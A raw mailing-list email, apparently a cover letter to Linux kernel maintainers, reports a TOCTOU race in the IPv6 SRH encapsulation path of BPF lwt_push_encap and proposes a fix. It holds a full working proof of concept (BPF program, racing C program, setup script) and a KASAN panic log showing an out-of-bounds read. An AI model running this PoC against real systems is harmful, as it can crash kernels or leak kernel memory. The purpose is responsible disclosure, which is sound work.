Received: from mail-pz2-f43.google.com (mail-pz2-f43.google.com [74.125.228.43])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EBFFD5275A1
	for <bpf@vger.kernel.org>; Thu, 17 Sep 2026 16:34:32 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.43
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789662876; cv=none; b=U8pe9XzToc4ygSwv8Biz6IIirikDOd138rJyaLlld44fFUDTdfRr0RP7ZqySxzbJ6i6fJwy6LaeWyOL+KEJRT5mchDe8cp+HrCn1eC6fjktF21dEB3UnMUiqkWC96wibFsGyCEYPnMrix6ZJYTwmOE3soOnB20fI92op9TNwlMw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789662876; c=relaxed/simple;
	bh=/Rlx7EZtpIpGOZY1222U9yLP1u/taVM8nPgW+Jg2SH8=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=FHtpc2vHrgpAvi/TsKyMQoMLdmLKyoo7H6mrjyMd28Mg8yZ+W0czS83aNJEXn06cT32fQ8twEZP6S0jRhVWlGOMHlF4P3Q81fgUwXmyDBFb57hi+5SLW0UEn2+MYhLqRfr9f0RMppcxqC5MAe4aSjykjh+1MXsD34asIhB+7iJ8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=LrKkrsvj; arc=none smtp.client-ip=74.125.228.43
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="LrKkrsvj"
Received: by mail-pz2-f43.google.com with SMTP id d2e1a72fcca58-85469b355ffso717758b3a.1
        for <bpf@vger.kernel.org>; Thu, 17 Sep 2026 09:34:32 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789662872; x=1790267672; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=JzVlhARkWX8jTJRmcMM87PUzCKPtXxefJ8kmSA4dDoE=;
        b=LrKkrsvjn18mY6fRgMrjSzg4JBvgcMVxj+nfMnataOR4J/P9ohBYYhhPE0Axq+ijC4
         PsLUpmGUX4XdRVTKd7QbHs1IPPTb0YjD9vVHle5FsDJTGpst/zzKyVhYbXe4C6SY/plW
         7cRmiIaBNgSEamL1X/201jtzUmkn9irIUE1oaXavSPIu3E8BHbDjSUNr6+k2yUVK+yi0
         dSgbRGirenlH2s8MuYO7ZmQvk7eeq2UO6/x5po+dZ5/ef1r8Sj8XJvf8ZjUoAoQEjcu8
         DLX4vtviTM0ZDuCH3WfIQ5Q+60VG6hbD9xK54h7q1fygzDUy3WSJHNxwATGPc2F6SQzt
         qZlg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789662872; x=1790267672;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=JzVlhARkWX8jTJRmcMM87PUzCKPtXxefJ8kmSA4dDoE=;
        b=DyM/gT/0PWDukbCOoUXiXHARlGq5FPaaOWZD0rhmAVNtBMSnMg8fGxxpAPi6UJ0Zzi
         JrjXLXi/JqvfkEl4cluALyEhPaRwgJmHuoTJiUAqKYyP1owcck5Gvwydw+PtgmxFbA2a
         R7JLQYYTEwHTHM5EOQK6Phfdnj0Bctxjt3LDNTnZnfUqsTBGf2ZFZaL1vuPdkaQ1cz2J
         4sit574kFMSGzxFcu0cgOgM4TKYBpFl/wEEKhGiQi/fLcv2JTJYxtEbUnQbqErtlSfXL
         7O7GSu16DvxNXBj0MF9WLDm174JtwNexgtwILGLl88EaPJ/RS2YFk1yiQF9dSW3tYnxc
         LSFA==
X-Gm-Message-State: AFuF++kdOch8PodpVlS6UNaXUsNUsVwyxPU4M8zW1W1Om6wBMF+FEYhG
	ZNotCcmN63FXzICFreRyXvX6C/3I2TNSeIVNZhdkVgNeOPL+kJ+4dc7/z2Gvwv+U/rvvFro8lEI
	oOFemvA==
X-Gm-Gg: AYBFou3mSw/anJ+qJL2q2LpzfDc7R5dpHHLMt2Osn8X4gSQs27Qi6pV1+8MO7A2gpqT
	nitbKHqgzh6GO6ZZ1LAwCqvVt5OL3kKNgIOlwA2j70sdxHcu3X/wJuaDFHGqHuLKBSZkd1s1sKF
	JPnzvl0tkN1ZQJRmUmiWssGxQg7Z63EqwGdt+HPoMVntOmKaWQyFi36y1jzx5Z2V0UfEP8Rb20L
	Wbu37DyrRW+Q9IiBaIXWQ6d2gF3JrtsUKH7kD9jQFpIpVozljxkOHu66nGVXeEmZLnyxEwO63s6
	hUgzFbN1MdvBDLxnMIudkkU9sQ63wL/LSsSHMT+p8tmzrAAVls30nmTqMSsvthRRprqXp5ZB6LE
	USGaL9Cb/SyBms1vv/xtQDYTlPUSzxb2S8G40YEaNedD9mnPXGFysnCihgin8tM1+priWVDizk3
	owFs42QbiK3xseUULyHXrxsnUAz7dDDQ75+1k6crV6ny1hkjEW8MgpKJ9XL0JipUU3Ut6hoQAOx
	VZy33Pqqw==
X-Received: by 2002:a05:6a00:3c86:b0:86d:c2d4:f3c0 with SMTP id d2e1a72fcca58-872376bd23bmr15058571b3a.9.1789662871947;
        Thu, 17 Sep 2026 09:34:31 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-872024e6a39sm3240251b3a.56.2026.09.17.09.34.18
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 17 Sep 2026 09:34:31 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: bpf@vger.kernel.org,
	netdev@vger.kernel.org
Cc: daniel@iogearbox.net,
	john.fastabend@gmail.com,
	sdf@fomichev.me,
	martin.lau@linux.dev,
	ast@kernel.org,
	andrii@kernel.org,
	eddyz87@gmail.com,
	memxor@gmail.com,
	song@kernel.org,
	yonghong.song@linux.dev,
	jolsa@kernel.org,
	emil@etsalapatis.com,
	ihor.solodrai@linux.dev,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	m.xhonneux@gmail.com,
	dlebrun@google.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH 0/1] bpf: fix TOCTOU in IPv6 SRH encapsulation
Date: Fri, 18 Sep 2026 00:33:50 +0800
Message-ID: <cover.1789646866.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

From: Luxiao Xu <rakukuip@gmail.com>=0D

Hi Linux kernel maintainers,=0D
=0D
We found and validated a issue in net/core/filter.c. The bug is reachable b=
y a non-root user via user and net namespace.=0D
We've tested it, and it should not affect any other functionality.=0D
=0D
We will provide detailed information about the bug=0D
in this email, along with a PoC to trigger it.=0D
=0D
---- details below ----=0D
=0D
Bug details:=0D
=0D
BPF helper SRH arguments may reference shared array-map values.=0D
In bpf_push_seg6_encap(), the SRH buffer is validated once using=0D
seg6_validate_srh() with the constant verifier-approved length.=0D
However, downstream encapsulation functions (such as __seg6_do_srh_encap()=
=0D
and __seg6_do_srh_inline() in net/ipv6/seg6_iptunnel.c) later reread=0D
fields such as hdrlen and first_segment without snapshotting the=0D
validated bytes.=0D
=0D
Another CPU or userspace process can concurrently update the array-map=0D
value between validation and use, changing hdrlen to request up to 2048=0D
bytes from a much smaller map allocation or changing the segment index.=0D
The resulting memcpy and segment access can read beyond the map bounds,=0D
placing adjacent kernel memory in a transmitted packet or triggering a=0D
kernel panic.=0D
=0D
Root cause:=0D
bpf_push_seg6_encap() passes a mutable pointer referencing shared BPF map=0D
memory directly onward without creating a private snapshot of the validated=
=0D
bytes. Downstream functions reread mutable fields from this buffer,=0D
creating a Time-of-Check to Time-of-Use (TOCTOU) race condition.=0D
=0D
Reproducer:=0D
=0D
    clang -O2 -target bpf -c poc.bpf.c -o poc.bpf.o=0D
    gcc -O2 -Wall -Wextra -pthread -o poc poc.c=0D
    ./poc.sh=0D
=0D
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
=0D
------BEGIN poc_common.h------=0D
=0D
#ifndef SEG6_HDRLEN_RACE_POC_COMMON_H=0D
#define SEG6_HDRLEN_RACE_POC_COMMON_H=0D
=0D
#include <linux/types.h>=0D
=0D
#define POC_SRH_VALUE_SIZE 504=0D
#define POC_SRH_GOOD_HDRLEN ((POC_SRH_VALUE_SIZE >> 3) - 1)=0D
#define POC_TLV_BYTES (POC_SRH_VALUE_SIZE - 8 - 16)=0D
#define POC_TLV_COUNT (POC_TLV_BYTES / 2)=0D
#define POC_SEG6_TYPE 4=0D
=0D
struct poc_in6_addr {=0D
	__u8 bytes[16];=0D
};=0D
=0D
struct poc_ipv6_sr_hdr {=0D
	__u8 nexthdr;=0D
	__u8 hdrlen;=0D
	__u8 type;=0D
	__u8 segments_left;=0D
	__u8 first_segment;=0D
	__u8 flags;=0D
	__be16 tag;=0D
};=0D
=0D
struct poc_tlv {=0D
	__u8 type;=0D
	__u8 len;=0D
};=0D
=0D
struct poc_srh_value {=0D
	struct poc_ipv6_sr_hdr srh;=0D
	struct poc_in6_addr segment0;=0D
	struct poc_tlv tlvs[POC_TLV_COUNT];=0D
};=0D
=0D
_Static_assert(sizeof(struct poc_ipv6_sr_hdr) =3D=3D 8,=0D
	       "unexpected SRH header size");=0D
_Static_assert((POC_TLV_BYTES % 2) =3D=3D 0, "TLV bytes must be divisible b=
y 2");=0D
_Static_assert(sizeof(struct poc_srh_value) =3D=3D POC_SRH_VALUE_SIZE,=0D
	       "unexpected SRH value size");=0D
=0D
#endif=0D
=0D
------END poc_common.h--------=0D
=0D
------BEGIN poc.bpf.c------=0D
=0D
#include <linux/bpf.h>=0D
=0D
#include "poc_common.h"=0D
=0D
#define SEC(name) __attribute__((section(name), used))=0D
#define __uint(name, val) int (*name)[val]=0D
#define __type(name, val) val *name=0D
=0D
static void *(*bpf_map_lookup_elem)(void *map, const void *key) =3D=0D
	(void *)BPF_FUNC_map_lookup_elem;=0D
static long (*bpf_lwt_push_encap)(struct __sk_buff *skb, __u32 encap_type,=
=0D
				      void *hdr, __u32 len) =3D=0D
	(void *)BPF_FUNC_lwt_push_encap;=0D
=0D
struct {=0D
	__uint(type, BPF_MAP_TYPE_ARRAY);=0D
	__uint(max_entries, 1);=0D
	__type(key, __u32);=0D
	__type(value, struct poc_srh_value);=0D
} seg6_srh_diy SEC(".maps");=0D
=0D
static __always_inline int do_push(struct __sk_buff *skb, __u32 encap_type)=
=0D
{=0D
	__u32 key =3D 0;=0D
	struct poc_srh_value *value;=0D
	long err;=0D
=0D
	value =3D bpf_map_lookup_elem(&seg6_srh_diy, &key);=0D
	if (!value)=0D
		return BPF_DROP;=0D
=0D
	err =3D bpf_lwt_push_encap(skb, encap_type, value, sizeof(*value));=0D
	if (err)=0D
		return BPF_DROP;=0D
=0D
	return BPF_REDIRECT;=0D
}=0D
=0D
SEC("encap")=0D
int encap_prog(struct __sk_buff *skb)=0D
{=0D
	return do_push(skb, BPF_LWT_ENCAP_SEG6);=0D
}=0D
=0D
SEC("inline")=0D
int inline_srh(struct __sk_buff *skb)=0D
{=0D
	return do_push(skb, BPF_LWT_ENCAP_SEG6_INLINE);=0D
}=0D
=0D
char _license[] SEC("license") =3D "GPL";=0D
=0D
------END poc.bpf.c--------=0D
=0D
------BEGIN poc.c------=0D
=0D
#define _GNU_SOURCE=0D
=0D
#include <arpa/inet.h>=0D
#include <errno.h>=0D
#include <fcntl.h>=0D
#include <linux/bpf.h>=0D
#include <pthread.h>=0D
#include <sched.h>=0D
#include <signal.h>=0D
#include <stdint.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/socket.h>=0D
#include <sys/syscall.h>=0D
#include <sys/types.h>=0D
#include <sys/wait.h>=0D
#include <time.h>=0D
#include <unistd.h>=0D
=0D
#include "poc_common.h"=0D
=0D
#define WRITER_COUNT 2=0D
#define SENDER_COUNT 2=0D
#define BATCH_SIZE 32=0D
#define PAYLOAD_SIZE 64=0D
=0D
struct run_config {=0D
	const char *map_path;=0D
	const char *netns_path;=0D
	const char *src_addr;=0D
	const char *dst_addr;=0D
	unsigned int seconds;=0D
};=0D
=0D
struct writer_args {=0D
	int map_fd;=0D
	int cpu;=0D
	const struct poc_srh_value *good;=0D
	const struct poc_srh_value *bad;=0D
	struct timespec end;=0D
};=0D
=0D
static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr)=0D
{=0D
	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));=0D
}=0D
=0D
static int bpf_obj_get_fd(const char *path)=0D
{=0D
	union bpf_attr attr;=0D
=0D
	memset(&attr, 0, sizeof(attr));=0D
	attr.pathname =3D (uintptr_t)path;=0D
	return sys_bpf(BPF_OBJ_GET, &attr);=0D
}=0D
=0D
static int bpf_map_update_fd(int fd, const void *key, const void *value)=0D
{=0D
	union bpf_attr attr;=0D
=0D
	memset(&attr, 0, sizeof(attr));=0D
	attr.map_fd =3D fd;=0D
	attr.key =3D (uintptr_t)key;=0D
	attr.value =3D (uintptr_t)value;=0D
	attr.flags =3D BPF_ANY;=0D
	return sys_bpf(BPF_MAP_UPDATE_ELEM, &attr);=0D
}=0D
=0D
static void set_cpu_affinity(int cpu)=0D
{=0D
	cpu_set_t set;=0D
=0D
	CPU_ZERO(&set);=0D
	CPU_SET(cpu, &set);=0D
	if (sched_setaffinity(0, sizeof(set), &set) =3D=3D -1)=0D
		perror("sched_setaffinity");=0D
}=0D
=0D
static void fill_good_value(struct poc_srh_value *value)=0D
{=0D
	memset(value, 0, sizeof(*value));=0D
=0D
	value->srh.hdrlen =3D POC_SRH_GOOD_HDRLEN;=0D
	value->srh.type =3D POC_SEG6_TYPE;=0D
	value->srh.segments_left =3D 0;=0D
	value->srh.first_segment =3D 0;=0D
=0D
	value->segment0.bytes[0] =3D 0xfd;=0D
	value->segment0.bytes[15] =3D 1;=0D
}=0D
=0D
static int deadline_reached(const struct timespec *end)=0D
{=0D
	struct timespec now;=0D
=0D
	if (clock_gettime(CLOCK_MONOTONIC, &now) =3D=3D -1) {=0D
		perror("clock_gettime");=0D
		return 1;=0D
	}=0D
=0D
	if (now.tv_sec > end->tv_sec)=0D
		return 1;=0D
=0D
	if (now.tv_sec =3D=3D end->tv_sec && now.tv_nsec >=3D end->tv_nsec)=0D
		return 1;=0D
=0D
	return 0;=0D
}=0D
=0D
static void *writer_thread(void *arg)=0D
{=0D
	static const __u32 key =3D 0;=0D
	struct writer_args *writer =3D arg;=0D
=0D
	set_cpu_affinity(writer->cpu);=0D
=0D
	while (!deadline_reached(&writer->end)) {=0D
		if (bpf_map_update_fd(writer->map_fd, &key, writer->bad) =3D=3D -1) {=0D
			perror("BPF_MAP_UPDATE_ELEM bad");=0D
			break;=0D
		}=0D
=0D
		if (bpf_map_update_fd(writer->map_fd, &key, writer->good) =3D=3D -1) {=0D
			perror("BPF_MAP_UPDATE_ELEM good");=0D
			break;=0D
		}=0D
	}=0D
=0D
	return NULL;=0D
}=0D
=0D
static void kill_children(pid_t *children, size_t count)=0D
{=0D
	size_t i;=0D
=0D
	for (i =3D 0; i < count; i++) {=0D
		if (children[i] > 0)=0D
			kill(children[i], SIGKILL);=0D
	}=0D
=0D
	for (i =3D 0; i < count; i++) {=0D
		if (children[i] > 0)=0D
			waitpid(children[i], NULL, 0);=0D
	}=0D
}=0D
=0D
static void sender_loop(const struct run_config *cfg, int cpu)=0D
{=0D
	char payloads[BATCH_SIZE][PAYLOAD_SIZE];=0D
	struct iovec iovecs[BATCH_SIZE];=0D
	struct mmsghdr msgs[BATCH_SIZE];=0D
	struct sockaddr_in6 src;=0D
	struct sockaddr_in6 dst;=0D
	int fd;=0D
	int i;=0D
=0D
	set_cpu_affinity(cpu);=0D
=0D
	fd =3D socket(AF_INET6, SOCK_DGRAM, 0);=0D
	if (fd =3D=3D -1) {=0D
		perror("socket");=0D
		_exit(1);=0D
	}=0D
=0D
	memset(&src, 0, sizeof(src));=0D
	src.sin6_family =3D AF_INET6;=0D
	if (inet_pton(AF_INET6, cfg->src_addr, &src.sin6_addr) !=3D 1) {=0D
		fprintf(stderr, "failed to parse source address %s\n",=0D
			cfg->src_addr);=0D
		_exit(1);=0D
	}=0D
=0D
	if (bind(fd, (struct sockaddr *)&src, sizeof(src)) =3D=3D -1) {=0D
		perror("bind");=0D
		_exit(1);=0D
	}=0D
=0D
	memset(&dst, 0, sizeof(dst));=0D
	dst.sin6_family =3D AF_INET6;=0D
	dst.sin6_port =3D htons(7330);=0D
	if (inet_pton(AF_INET6, cfg->dst_addr, &dst.sin6_addr) !=3D 1) {=0D
		fprintf(stderr, "failed to parse destination address %s\n",=0D
			cfg->dst_addr);=0D
		_exit(1);=0D
	}=0D
=0D
	for (i =3D 0; i < BATCH_SIZE; i++) {=0D
		memset(payloads[i], 'A' + (i % 26), sizeof(payloads[i]));=0D
=0D
		memset(&iovecs[i], 0, sizeof(iovecs[i]));=0D
		iovecs[i].iov_base =3D payloads[i];=0D
		iovecs[i].iov_len =3D sizeof(payloads[i]);=0D
=0D
		memset(&msgs[i], 0, sizeof(msgs[i]));=0D
		msgs[i].msg_hdr.msg_iov =3D &iovecs[i];=0D
		msgs[i].msg_hdr.msg_iovlen =3D 1;=0D
		msgs[i].msg_hdr.msg_name =3D &dst;=0D
		msgs[i].msg_hdr.msg_namelen =3D sizeof(dst);=0D
	}=0D
=0D
	for (;;) {=0D
		if (sendmmsg(fd, msgs, BATCH_SIZE, 0) < 0) {=0D
			if (errno =3D=3D EINTR || errno =3D=3D ENOBUFS ||=0D
			    errno =3D=3D ECONNREFUSED || errno =3D=3D EHOSTUNREACH ||=0D
			    errno =3D=3D ENETUNREACH)=0D
				continue;=0D
=0D
			perror("sendmmsg");=0D
			_exit(1);=0D
		}=0D
	}=0D
}=0D
=0D
static pid_t start_sender(const struct run_config *cfg, int cpu)=0D
{=0D
	pid_t pid;=0D
	int nsfd;=0D
=0D
	pid =3D fork();=0D
	if (pid !=3D 0)=0D
		return pid;=0D
=0D
	nsfd =3D open(cfg->netns_path, O_RDONLY);=0D
	if (nsfd =3D=3D -1) {=0D
		perror("open netns");=0D
		_exit(1);=0D
	}=0D
=0D
	if (setns(nsfd, CLONE_NEWNET) =3D=3D -1) {=0D
		perror("setns");=0D
		_exit(1);=0D
	}=0D
	close(nsfd);=0D
=0D
	sender_loop(cfg, cpu);=0D
	_exit(0);=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	struct poc_srh_value good;=0D
	struct poc_srh_value bad;=0D
	struct writer_args writers[WRITER_COUNT];=0D
	pthread_t writer_threads[WRITER_COUNT];=0D
	struct run_config cfg;=0D
	struct timespec end;=0D
	pid_t children[SENDER_COUNT];=0D
	static const __u32 key =3D 0;=0D
	int map_fd;=0D
	int i;=0D
=0D
	if (argc !=3D 6) {=0D
		fprintf(stderr,=0D
			"usage: %s <pinned-map> <netns-path> <src-ipv6> <dst-ipv6> <seconds>\n",=
=0D
			argv[0]);=0D
		return 2;=0D
	}=0D
=0D
	memset(&cfg, 0, sizeof(cfg));=0D
	cfg.map_path =3D argv[1];=0D
	cfg.netns_path =3D argv[2];=0D
	cfg.src_addr =3D argv[3];=0D
	cfg.dst_addr =3D argv[4];=0D
	cfg.seconds =3D strtoul(argv[5], NULL, 0);=0D
=0D
	map_fd =3D bpf_obj_get_fd(cfg.map_path);=0D
	if (map_fd =3D=3D -1) {=0D
		perror("BPF_OBJ_GET");=0D
		return 1;=0D
	}=0D
=0D
	fill_good_value(&good);=0D
	bad =3D good;=0D
	bad.srh.hdrlen =3D 0xff;=0D
=0D
	if (bpf_map_update_fd(map_fd, &key, &good) =3D=3D -1) {=0D
		perror("BPF_MAP_UPDATE_ELEM initial");=0D
		return 1;=0D
	}=0D
=0D
	memset(children, 0, sizeof(children));=0D
	for (i =3D 0; i < SENDER_COUNT; i++) {=0D
		children[i] =3D start_sender(&cfg, WRITER_COUNT + i);=0D
		if (children[i] =3D=3D -1) {=0D
			perror("fork");=0D
			kill_children(children, SENDER_COUNT);=0D
			return 1;=0D
		}=0D
	}=0D
=0D
	if (clock_gettime(CLOCK_MONOTONIC, &end) =3D=3D -1) {=0D
		perror("clock_gettime");=0D
		kill_children(children, SENDER_COUNT);=0D
		return 1;=0D
	}=0D
	end.tv_sec +=3D cfg.seconds;=0D
=0D
	fprintf(stderr,=0D
		"racing hdrlen for %u seconds with %d writer threads and %d sender proces=
ses\n",=0D
		cfg.seconds, WRITER_COUNT, SENDER_COUNT);=0D
=0D
	for (i =3D 0; i < WRITER_COUNT; i++) {=0D
		memset(&writers[i], 0, sizeof(writers[i]));=0D
		writers[i].map_fd =3D map_fd;=0D
		writers[i].cpu =3D i;=0D
		writers[i].good =3D &good;=0D
		writers[i].bad =3D &bad;=0D
		writers[i].end =3D end;=0D
=0D
		if (pthread_create(&writer_threads[i], NULL, writer_thread,=0D
				   &writers[i]) !=3D 0) {=0D
			perror("pthread_create");=0D
			kill_children(children, SENDER_COUNT);=0D
			return 1;=0D
		}=0D
	}=0D
=0D
	for (i =3D 0; i < WRITER_COUNT; i++)=0D
		pthread_join(writer_threads[i], NULL);=0D
=0D
	kill_children(children, SENDER_COUNT);=0D
	return 1;=0D
}=0D
=0D
------END poc.c--------=0D
=0D
------BEGIN poc.sh------=0D
=0D
#!/bin/sh=0D
set -eu=0D
=0D
DIR=3D$(CDPATH=3D cd -- "$(dirname -- "$0")" && pwd)=0D
NS1=3Dseg6diy1=0D
NS2=3Dseg6diy2=0D
MAP_PIN=3D/sys/fs/bpf/seg6_srh_diy=0D
SRC_ADDR=3Dfb00::1=0D
DST_ADDR=3Dfb00::6=0D
SECONDS=3D${SECONDS:-120}=0D
=0D
cleanup() {=0D
	set +e=0D
	ip netns del "$NS1" 2>/dev/null=0D
	ip netns del "$NS2" 2>/dev/null=0D
	rm -f "$MAP_PIN"=0D
}=0D
=0D
setup_namespaces() {=0D
	ip netns add "$NS1"=0D
	ip netns add "$NS2"=0D
=0D
	ip link add veth1 type veth peer name veth2=0D
	ip link set veth1 netns "$NS1"=0D
	ip link set veth2 netns "$NS2"=0D
=0D
	ip -n "$NS1" link set lo up=0D
	ip -n "$NS1" link set veth1 up=0D
	ip -n "$NS2" link set lo up=0D
	ip -n "$NS2" link set veth2 up=0D
=0D
	ip -n "$NS1" -6 addr add fb00::12/16 dev veth1 scope link=0D
	ip -n "$NS1" -6 addr add "$SRC_ADDR"/128 dev lo=0D
	ip -n "$NS2" -6 addr add fb00::21/16 dev veth2 scope link=0D
=0D
	ip -n "$NS1" -6 route add "$DST_ADDR" via fb00::21 dev veth1=0D
	ip -n "$NS2" -6 route add fd00::/16 dev veth2=0D
=0D
	ip netns exec "$NS2" sysctl -q net.ipv6.conf.all.forwarding=3D1=0D
	ip netns exec "$NS2" sysctl -q net.ipv6.conf.all.seg6_enabled=3D1=0D
	ip netns exec "$NS2" sysctl -q net.ipv6.conf.veth2.seg6_enabled=3D1=0D
}=0D
=0D
load_mode() {=0D
	mode=3D$1=0D
	map_id=3D=0D
=0D
	ip -n "$NS2" -6 route add "$DST_ADDR" encap bpf in obj \=0D
		"$DIR/poc.bpf.o" sec "$mode" dev veth2=0D
=0D
	map_id=3D$(bpftool -j map show | jq -r \=0D
		'[.[] | select(.name =3D=3D "seg6_srh_diy")] | last | .id')=0D
=0D
	if [ -z "$map_id" ] || [ "$map_id" =3D "null" ]; then=0D
		echo "failed to locate seg6_srh_diy map" >&2=0D
		return 1=0D
	fi=0D
=0D
	rm -f "$MAP_PIN"=0D
	bpftool map pin id "$map_id" "$MAP_PIN"=0D
}=0D
=0D
if [ ! -x "$DIR/poc" ]; then=0D
	gcc -O2 -Wall -Wextra -pthread -o "$DIR/poc" "$DIR/poc.c"=0D
fi=0D
=0D
if [ ! -f "$DIR/poc.bpf.o" ]; then=0D
	echo "missing $DIR/poc.bpf.o; build it with make on the host or install cl=
ang in the guest" >&2=0D
	exit 1=0D
fi=0D
=0D
grep -qs ' /sys/fs/bpf ' /proc/mounts || mount -t bpf bpf /sys/fs/bpf=0D
=0D
trap cleanup EXIT INT TERM=0D
cleanup=0D
=0D
for mode in encap inline; do=0D
	echo "trying mode: $mode" >&2=0D
	setup_namespaces=0D
	load_mode "$mode"=0D
=0D
	set +e=0D
	"$DIR/poc" "$MAP_PIN" "/run/netns/$NS1" "$SRC_ADDR" "$DST_ADDR" "$SECONDS"=
=0D
	status=3D$?=0D
	set -e=0D
=0D
	if [ "$status" -eq 0 ]; then=0D
		exit 0=0D
	fi=0D
=0D
	echo "mode $mode did not crash within ${SECONDS}s" >&2=0D
	cleanup=0D
done=0D
=0D
exit 1=0D
=0D
------END poc.sh--------=0D
=0D
----BEGIN crash log----=0D
=0D
[  276.949174][    C3] page_owner tracks the page as allocated=0D
[  276.949657][    C3] page last allocated via order 3, migratetype Unmovab=
le, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COM=
P|__GFP_NOMEMALLOC), pid 1, tgid 1 (systemd), ts 274478733398, free_ts 2663=
06304894=0D
[  276.951258][    C3] page last free pid 10427 tgid 10427 stack trace:=0D
[  276.951915][    C3] Kernel panic - not syncing: KASAN: panic_on_warn set=
 ...=0D
[  276.952401][    C3] CPU: 3 UID: 0 PID: 36 Comm: ksoftirqd/3 Not tainted =
6.12.95 #2=0D
[  276.952962][    C3] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PII=
X, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[  276.953755][    C3] Call Trace:=0D
[  276.953985][    C3]  <TASK>=0D
[  276.954188][    C3]  panic+0x533/0x610=0D
[  276.954479][    C3]  ? __pfx_panic+0x10/0x10=0D
[  276.954789][    C3]  ? rcu_is_watching+0x12/0xc0=0D
[  276.955131][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  276.955530][    C3]  ? __pfx_lock_release+0x10/0x10=0D
[  276.955861][    C3]  ? __pfx__printk+0x10/0x10=0D
[  276.956183][    C3]  ? __seg6_do_srh_encap+0x5cd/0x10e0=0D
[  276.956545][    C3]  check_panic_on_warn+0x61/0x80=0D
[  276.956880][    C3]  end_report+0x11b/0x180=0D
[  276.957184][    C3]  kasan_report+0xe8/0x110=0D
[  276.957501][    C3]  ? __seg6_do_srh_encap+0x5cd/0x10e0=0D
[  276.957857][    C3]  kasan_check_range+0xf4/0x1a0=0D
[  276.958182][    C3]  __asan_memcpy+0x23/0x60=0D
[  276.958510][    C3]  __seg6_do_srh_encap+0x5cd/0x10e0=0D
[  276.958850][    C3]  ? __pfx_fib6_rule_lookup+0x10/0x10=0D
[  276.959208][    C3]  ? process_backlog+0x38c/0x1400=0D
[  276.959567][    C3]  bpf_push_seg6_encap+0x400/0x500=0D
[  276.959906][    C3]  bpf_lwt_in_push_encap+0x34/0x50=0D
[  276.960251][    C3]  bpf_prog_8f4d49409a198b5d_encap_prog+0x6f/0x88=0D
[  276.960675][    C3]  run_lwt_bpf.isra.0+0x32f/0x8c0=0D
[  276.961031][    C3]  ? __pfx_run_lwt_bpf.isra.0+0x10/0x10=0D
[  276.961418][    C3]  ? __pfx_ip6_route_input+0x10/0x10=0D
[  276.961800][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  276.962164][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  276.962551][    C3]  ? rcu_is_watching+0x12/0xc0=0D
[  276.962878][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  276.963263][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  276.963669][    C3]  ? process_backlog+0x38c/0x1400=0D
[  276.963990][    C3]  bpf_input+0xa6/0xa10=0D
[  276.964272][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  276.964643][    C3]  ? __pfx_ipv6_rcv+0x10/0x10=0D
[  276.964976][    C3]  ? process_backlog+0x38c/0x1400=0D
[  276.965315][    C3]  lwtunnel_input+0x1e9/0x4e0=0D
[  276.965651][    C3]  __netif_receive_skb_one_core+0x11a/0x1b0=0D
[  276.966059][    C3]  ? __pfx___netif_receive_skb_one_core+0x10/0x10=0D
[  276.966508][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  276.966864][    C3]  ? lock_acquire+0x2f/0xb0=0D
[  276.967213][    C3]  ? process_backlog+0x38c/0x1400=0D
[  276.967560][    C3]  process_backlog+0x3cc/0x1400=0D
